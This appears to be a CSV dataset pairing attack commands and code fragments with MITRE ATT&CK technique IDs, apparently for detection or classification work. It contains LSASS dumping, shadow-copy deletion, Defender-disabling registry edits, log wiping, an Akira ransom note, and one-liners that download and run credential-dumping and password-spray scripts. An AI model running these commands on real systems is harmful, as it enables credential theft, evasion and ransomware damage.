"for ip in $(seq $start_host $stop_host); do ping -c 1 $subnet.$ip; [ $? -eq 0 ] && echo ""$subnet.$ip UP"" || : ; done",T1018
Remove-Item $ExcelRegPath -ErrorAction Ignore,T1137
sudo mdatp config real-time-protection --value disabled,T1562
"echo ""[Unit]"" > $path_to_systemd_timer",T1053
pcalua.exe -a {PATH_SMB:.dll},T1202
Register-ScheduledTask AtomicTask -InputObject $object,T1053
sdclt.exe,T1548
-WindowsStyle Hidden,T1564
ls C:/Users,T1087
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1,T1003
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule,T1562
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain $domain -Subdomain $subdomain -QueryType $query_type -C2Interval $c2_interval -C2Jitter $c2_jitter -RunTime $runtime,T1071
"echo ""*** Log Stream Deleted ***""",T1562
/proc/<PID>/mem,T1003
find /usr/bin -perm -4000,T1548
"Write-Host ""Extraction completed."" -ForegroundColor Green",T1562
SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.,T1053
[System.Windows.Forms.SendKeys]::SendWait('^v'),T1202
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""vim-cmd hostsvc/enable_ssh""",T1021
Add-MailboxPermission,T1098
RunOnce,T1547
Remove-Service -Name $service_name,T1562
/etc/ssh/keys-<username>/authorized_keys,T1098
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt,T1218
Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $mshta_file_path,T1218
touch -t,T1070
whoami.exe,T1033
$HKLM\SOFTWARE\Classes\Interface\,T1480
"write-output ""------------""| out-file $output_file -append",T1012
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},T1105
"echo ""5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
write-output $($CLSID)| out-file $output_file -append,T1012
CreateServiceW,T1543
mount –o bind /proc/benign-process /proc/malicious-process,T1564
"cmd.exe /c ""net use \\$computer_name\$share_name $password /u:$user_name""",T1021
"[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd",T1003
"wscript.exe ""$vbscript_file""",T1105
Invoke-WebRequest,T1105
Reflection.Assembly,T1059
"if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi",T1082
hy_AM,T1614
IEX (IWR $script_url -UseBasicParsing),T1003
api.apple-cloudkit.com,T1553
WriteFile,T1106
rsync -r $local_path $username@$remote_host:$remote_path,T1105
sqldumper.exe 464 0 0x0110,T1003
.au3,T1059
return false;,T1562
esxcli network nic list,T1016
systeminfo >> %temp%\download,T1082
Vsjitdebugger.exe {PATH:.exe},T1127
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices,T1060
LSEnvironment,T1547
Excel.exe {REMOTEURL},T1105
reg query \\<host>\HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers,T1012
"IF EXIST ""%temp%\Windows_Defender_Scheduled_Scan.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /f )",T1562
"for($i=0; $i -le $query_volume; $i++) { Resolve-DnsName -type ""$query_type"" ""$subdomain-$(Get-Random -Minimum 1 -Maximum 999999).$domain"" -QuickTimeout}",T1071
"""$exe_binary""",T1055
"logger.exe RUNW ""{CMD}""",T1202
"""$vboxmanage_exe"" modifyvm ""$vm_name"" --firmware efi",T1564
bcdedit /set safeboot network,T1562
ExecStopPre,T1543
Windows\CurrentVersion\Uninstall,T1012
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx,T1012
"set-WebConfigurationProperty -PSPath ""IIS:\Sites\$website_name\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true",T1562
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain $domain -Subdomain $subdomain -QueryType $query_type,T1071
AppCertDLLs,T1546
C:\windows\System32\oobe\Setup,T1546
echo Username: %USERNAME% > %file%,T1033
/var/log/shell.log,T1070
C:\Users\<username>\Documents\Outlook Files,T1114
CSIDL_SYSTEM\cmd.exe /c ping -n 1,T1016
lazagnemodule -consoleoutput -noninteractive,T1555
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f",T1484
"Write-Host ""64-bit Office""",T1137
systems.exe,T1036
net user /domain >> %temp%\download,T1087
/System/Library/LaunchDaemons/,T1543
"sudo find /var/log -name '$system_log_name1*' -exec rm {} \; #using ""rm"" execution",T1070
netsh portproxy,T1090
tasklist | findstr $process_to_enumerate,T1057
SystemLocale = Get-WinSystemLocale,T1614
"Copy-Item -path ""$payload"" -destination ""$new_startup_folder""",T1547
echo $dash_encoded | base64 -d | bash,T1140
"echo ""# Provides : Atomic Test T1543.002"" >> /etc/init.d/T1543.002",T1543
Invoke-ReflectivePEInjection.ps1,T1055
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},T1218
FileReadZipSend,T1560
IPersistFile,T1559
Invoke-ShareFinder $parameters,T1135
"Write-Host ""Registry value created: $registryValueName""",T1562
"echo """" > $HISTFILE",T1562
"Start-Process ""$Splashtop_Path""",T1219
xattr -l,T1564
$HOME/.config/autostart/,T1547
"echo ""$command"" > /etc/cron.monthly/$cron_script_name",T1053
HH.exe {REMOTEURL:.chm},T1218
if (Test-Path -Path $registryPath) {,T1505
echo 'os.system(malicious_command)' >> $python_script_name,T1059
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f",T1484
"net group ""Domain Computers"" /domain",T1018
sed -i '$ a #art_test_1562_006_1' /etc/$libaudit_config_file_name,T1562
wlanAPI,T1110
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -callBack {PATH:.exe}",T1202
unset ART,T1059
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force,T1546
W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2,T1124
nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap},T1040
"cmd.exe /c ""<file_path> > %temp%\PM* .tmp 2>&1""",T1059
HKCU\Software\Classes\Folder\shell\open\command,T1112
MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},T1218
Start-Process .\BadPotato.exe notepad.exe,T1134
"Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse",T1562
"Invoke-Maldoc -macroFile ""$txt_path"" -officeProduct ""Word"" -sub ""Execute""",T1055
"Write-Output ""Uploaded the tampered file""",T1528
cmd.exe /C whoami,T1033
sc start VBoxDRV,T1564
"$xlApp.Run(""runme"")",T1204
"public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);",T1562
pnputil.exe -i -a {PATH_ABSOLUTE:.inf},T1547
SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy,T1112
"New-ItemProperty $ExcelRegPath ""Autoload"" -value ""1"" -propertyType DWORD | Out-Null",T1137
0xcc,T1485
Register-ScheduleTask,T1053
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL},T1105
HAL9TH,T1497
Windows Defend,T1543
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""",T1137
HKCR\enc\shell\open\command,T1112
"find $file_path/.oci/sessions -name ""token"" -type f 2>/dev/null",T1552
/usr/libexec/setconf/ksmd,T1036
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue,T1552
"REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""$script_path"" /f",T1037
/var/lock,T1027
HKCU\Software\snimtsOleht\StubPath,T1547
"if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}",T1547
/etc/rc.d/init.d,T1037
"osascript -e ""do shell script \""echo \\\""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\"" | python &\""""",T1059
dir C:\progra~1,T1083
/run/udev/rules.d/,T1546
echo $! > /tmp/evil_pid.txt,T1036
whoami.exe /all >> $output_path\$file,T1033
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScriptScanning"" -Value 1",T1562
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist,T1217
"find $file_path/.aws -name ""credentials"" -type f 2>/dev/null",T1552
GetSystemFirmwareTable,T1082
/etc/shadow,T1556
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f",T1490
SysWOW64,T1055
"sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto",T1569
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security,T1027
net user administrator /domain,T1087
Microsoft.Authorization/elevateAccess/action,T1098
"osascript -e ""script here""",T1059
cmd.exe /c net user {Username},T1087
mmc gpedit.msc,T1218
eval '(while true; do :; done) &',T1036
"$sheet.Cells.Item(13,1) = ""=FWRITELN(A5, `""oStream.Open`"")""",T1204
aws cloudtrail update-trail --name $cloudtrail_name --s3-bucket-name $s3_bucket_name --is-multi-region-trail --region $region,T1562
GetTextCharset,T1614
"New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force",T1112
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableAttachementsInPV"" -Value ""1"" -PropertyType ""Dword""",T1562
wmiprvse.exe,T1047
busybox sh &,T1059
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.,T1218
"function nslookup { &""$env:windir\system32\nslookup.exe"" @args | Out-Null; @("""",""whoami"")}",T1059
launchctl,T1569
EventNameSpace='root\CimV2';,T1546
"New-ItemProperty $ExcelRegPath OPEN -value ""/R notepad.xll"" -propertyType string | Out-Null",T1137
cmd.exe - < {PATH}:payload.bat,T1059
/etc/xdg/autostart,T1547
az login # Login to Azure,T1619
statvfs,T1083
"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows Defender"" -Name ""PUAProtection"" -Value 0",T1562
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default,T1070
postinstall,T1546
C:\windows\system32\drivers\,T1036
C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL,T1218
"if [ $(history |wc -l) -eq 2 ]; then echo ""Their is only one entry for ls -la $HISTFILE""; fi",T1562
Get-AdvancedSetting -Entity $vm_host -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false,T1562
%WinDir%\System32\PluginManager,T1036
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,T1003
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null,T1137
systemctl restart sshd,T1056
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f",T1112
wt.exe {CMD},T1202
cmd /c ping localhost -n 3 > nul & del,T1070
auditpol,T1562
"Write-Host ""User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""",T1098
set +o history,T1070
com.apple.GrowlHelper.plist,T1543
VisualUiaVerifyNative.exe,T1218
echo 'sleep 5' | /tmp/crond,T1036
"New-LocalUser -Name ""Administrator "" -NoPassword",T1564
if (Test-Path $zipPath) {,T1562
"copy ""$vbs_path"" %temp%\T1036.007_masquerading.png.vbs /Y",T1036
systemctl disable cbdaemon,T1562
"$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)",T1113
[System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {,T1083
certutil,T1140
Visio.exe {REMOTEURL},T1105
sudo chown root $file_to_setuid,T1548
dscl . -create /Users/$username UserShell /bin/zsh,T1136
reg add “HKEY_CURRENT_USER\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]”,T1112
"reg save hklm\sam, reg save hklm\system,",T1003
net start spooler,T1547
sudo defaults write com.apple.loginwindow LoginHook $script,T1547
MsoHtmEd.exe {REMOTEURL},T1105
vssadmin delete shadows /all /quiet,T1490
"UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup",T1548
at.deny,T1053
OpenEventA,T1057
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",T1112
test -e $input_file && gzip -k $input_file || (echo '$input_content' >> $input_file; gzip -k $input_file),T1560
net users >> %file%,T1033
PTRACE_SETREGS,T1055
"if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > $output_file; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > $output_file; fi",T1003
sudo chmod +x /etc/rc.local,T1037
sudo killall -SIGTERM $process_name,T1489
public class Wallpaper{,T1491
nltest /trusted_domains,T1482
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
"echo ""$command"" > /etc/cron.daily/$cron_script_name",T1053
Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath $pfx_path,T1552
"Get-ADComputer $hostname -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",T1087
%Temp%\reports\%,T1074
"New-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"" -Name ""VEDetector"" -Value ""$ved_path\VEDetector.exe"" -PropertyType String -Force",T1036
"powershell.exe -c ""gdr -PSProvider 'FileSystem'""",T1082
Start-Sleep -Seconds 5,T1036
cacls,T1222
"""$dumpert_exe""",T1003
$User.SamAccountName = $SamAccountName,T1136
ProcessWindowStyle.Hidden,T1564
curl --upload-file,T1048
ufw status numbered,T1562
MiniDumpWriteDump Win32,T1003
write.exe,T1218
SetErrorMode,T1562
"if (!LookupPrivilegeValue(null, ""SeDebugPrivilege"", out luid))",T1562
"cmd.exe /c ""$local_folder\$local_executable"" golden /aes256:$krbtgt_aes256_key /ldap /user:$account /dc:$($domaincontroller) /printcmd /outfile:golden",T1558
"if (test-path ""$env:appdata\Opera Software\Opera Stable\Login Data"") {copy-item ""$env:appdata\Opera Software\Opera Stable\Login Data"" -destination ""$exfil_folder\T1555.003Opera_Login Data""} else {}",T1555
systemd,T1562
"C:\\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db""",T1218
"echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> /etc/pam.d/sshd",T1056
"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null",T1003
%SYSTEM32%,T1055
/dev/null,T1562
New-WebGlobalModule -Name $module_name -Image $dll_path,T1505
coremedia.sh,T1546
"{try{write-output ""$($Position)-$($CLSID)""",T1012
malware,T1564
"""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\$target add $task_name ""cmd.exe"" ""/c $task_command"" $user_name logon",T1053
gcloud secrets describe,T1555
"start ""$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx""",T1559
a9850d2f,T1074
HKEY_CURRENT_USER\SOFTWARE\{8 random characters},T1112
%SystemRoot%\System32\Config,T1027
example.timer,T1053
"ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String ""password"", ""-p"", ""key"", ""pwd"", ""pass""",T1552
chmod +x /tmp/art.sh,T1027
%ALLUSERPROFILE%\\Application Data\Microsoft\MediaPlayer\updatewindws.exe,T1036
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings,T1012
krb5.ccache,T1558
profile.ps1,T1546
InstallLanguage,T1614
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),T1555
net group “domain admins” /domain,T1087
pw useradd art -g wheel -s /bin/sh,T1078
OutputDebugStringW,T1106
"sudo echo osascript -e 'tell app ""Finder"" to display dialog ""Hello World""' >> /etc/rc.common",T1037
"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
"New-Item -Path ""$output_path"" -ItemType Directory > $null",T1069
"$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null",T1552
POWERSHELL -c 'Start-Sleep 1',T1574
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force,T1546
HKCU\SOFTWARE\Plus,T1027
pw user mod art -e +99d,T1078
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL},T1105
dscl . -create /Users/AtomicUser PrimaryGroupID 503,T1078
"Write-Host ""Process started successfully with Process ID: $($Result.ProcessId)""",T1546
sudo sh -c 'echo $path_to_shared_library > /etc/ld.so.preload',T1574
evil.bin,T1036
wsreset.exe,T1548
certutil.exe -URL {REMOTEURL:.exe},T1105
cat /etc/passwd |grep nobody,T1078
"cscript ""$jscript"" > %tmp%\T1059.007.out.txt",T1059
/proc/self/status,T1622
esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o,T1105
C:\Users\\%username%\Documents\Default.rdp,T1070
%Program Data%,T1574
$which_openssl genrsa -out $private_key_path $encryption_bit_size,T1486
make /tmp/hello,T1548
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit},T1003
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $domain -Force,T1110
text/html,T1027
$FN,T1070
/sbin/auditd -n,T1036
"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""$executable_binary"" /f",T1548
decryptteamviewer -consoleoutput -noninteractive,T1555
echo y | $pscp_binary -P $scp_port -pw $scp_password $exfil_package $scp_user@$target_location:$target_filename,T1105
"osascript -e 'tell application ""Finder"" to delete POSIX file ""$system_log_path""'",T1070
"REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""$thing_to_execute""",T1547
"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""$monitor_dll"" /t REG_SZ /f",T1547
tp.Luid = luid;,T1562
systemctl start $systemd_service_file,T1543
"Write-Host ""Registry value created: $newValueName with data $newValueData""",T1562
CopyFromScreen,T1113
scp $local_file $username@$remote_host:$remote_path,T1105
sudo truncate -s 0 $system_log_path #size parameter shorthand,T1070
get-childitem C:\Users\,T1087
if ($ActualOutput -ne $ExpectedOutput) {,T1218
security dump-keychain –d,T1555
Test-NetConnection -CommonTCPPort SMB -ComputerName $target,T1016
launchctl load -w /Library/LaunchAgents/$plist_filename,T1543
/proc/[pid]/maps,T1055
"echo ""\$PROMPT_COMMAND=$PROMPT_COMMAND""",T1056
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*,T1003
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\,T1547
ScriptText=',T1546
LogonUserW,T1106
Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue,T1564
"& $edgePath --disable-gpu-sandbox --gpu-launcher=""C:\\Windows\\System32\\calc.exe &&""",T1218
"powershell.exe -c ""Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt""",T1082
echo URL=C:\windows\system32\calc.exe >> $shortcut_file_path,T1547
GetSystemDefaultLCID,T1614
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 1",T1562
ping -n 4 $ping_target,T1016
smbstatus --shares,T1135
if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;,T1056
Invoke-WebRequest $server_name -UseBasicParsing,T1056
AutoUpdater.js,T1036
C:\Program\Files\,T1518
catch{ $_; exit $_.Exception.Response.StatusCode.Value__},T1003
ssh.exe,T1202
cd PathToAtomicsFolder/T1567.002/src/,T1567
NetShareEnum(),T1135
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,T1112
cat /etc/passwd,T1036
AddPrintProcessor,T1547
"Write-Host ""End of federation configuration.""",T1484
com.apple.loginwindow.plist,T1037
halt -p,T1529
"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /etc/sudoers""",T1548
new-itemproperty $key$name -Name * -Value 2 -Type DWORD;,T1112
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f",T1112
"New-ItemProperty -Path $commandpath -Name ""DelegateExecute"" -Value """" -Force | Out-Null",T1548
Http{Extension/Filter}Proc,T1505
sudo kill -SIGTERM $(pgrep $process_name),T1489
"echo ""1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) $optional_args",T1087
"echo ""password123"" | pw usermod art -h 0",T1110
hh.exe $remote_chm_file,T1218
closeanddeletestorage,T1070
"Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""",T1012
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {,T1564
.pid,T1074
shmget,T1106
"Write-Host -ForegroundColor Cyan ""Successfully changed the password to $new_password""",T1098
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f,T1112
aws logs delete-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,T1562
"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""",T1060
AMQP,T1071
"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",T1218
service art-test enable,T1543
"Get-VMHostService -VMHost $vm_host | Where-Object {$_.Key -eq ""TSM-SSH"" } | Start-VMHostService -Confirm:$false",T1021
systemd-daemon,T1036
ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+,T1680
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%,T1490
"echo ""*** Log Stream Created ***""",T1562
pushd $destination_path,T1105
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""SpynetReporting"" -Value 0",T1562
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s $dll_name) ELSE ( $regsvr32path\$regsvr32name /s $dll_name )",T1218
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config,T1003
winnt\syswow64,T1053
chmod +x 'testdirwithspaceend /init ',T1036
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi,T1037
sudo systemctl stop $service_name,T1489
echo '#\!/bin/sh' > $rc_service_path/$rc_service_file,T1543
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force",T1112
dfhsebxzod,T1546
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" ""StubPath"" ""$payload"" -Force",T1547
"net share test=$share_name /REMARK:""test share"" /CACHE:No",T1070
halt -r,T1529
xcopy,T1560
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoRebootWithLoggedOnUsers"" /t REG_DWORD /d 1 /f",T1112
"echo ""flag2"" > $flagPath2",T1137
cmd.exe /c,T1059
C:\Windows\System32\vssadmin.exe delete shadows /all /quiet,T1490
curl -s -L -o,T1048
"curl -s -A ""*<|>*"" -m3 $domain",T1071
finally{,T1491
uname -a >> $output_file,T1082
site-packages,T1546
GetConsoleWindow,T1106
reg.exe,T1003
az login # Log in to Azure CLI,T1528
sudo insmod $module_path,T1547
zip,T1560
"Write-Host "" [-] Attempting ${password} on account $user.""",T1110
pktmon.exe filter add -p 445,T1040
Capture,T1113
icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t,T1546
"""$python_exe"" -m venv ""$TEMPDIR/env""",T1546
type = s3,T1567
Connect-AZAccount,T1021
"Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *",T1087
Connect-AzureAD -Credential $creds,T1562
"Write-Output ""Please choose a valid execution_option""",T1528
GetProcessHeap,T1106
MsBuild.exe,T1057
%ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\,T1036
"echo ""### BEGIN INIT INFO"" >> /etc/init.d/T1543.002",T1543
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1012
xwd -root -out $output_file,T1113
"WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY)",T1018
"if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"" -destination ""$exfil_folder\T1555.003Chrome_Login Data For Account""} else {}",T1555
ZwWriteVirtualMemory,T1055
"if (Test-Path $toolsDir) { python $toolsDir -s ""$cache_path"" -d $output_dir -b }",T1113
df -aH,T1135
authorized_keys,T1098
"{echo ""FTP Server Unreachable. Please verify the server address in input args and try again.""}",T1048
"""$mimikatz_exe"" ""kerberos::ptt $ticket""",T1550
phish,T1564
spctl,T1553
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),T1003
"Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name 'Security Packages old' -Value ""$oldvalue"";",T1547
chkconfig off cbdaemon,T1562
$LANG,T1614
"copy ""$vbs_path"" %temp%\T1036.007_masquerading.xls.vbs /Y",T1036
ZwSetValueKey(),T1543
"net localgroup administrators ""$username"" /add",T1136
msiexec.exe,T1218
} catch {},T1046
xattr,T1564
New-Item -Path $folderPath -ItemType Directory,T1105
nltest/dclist,T1018
"$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()",T1539
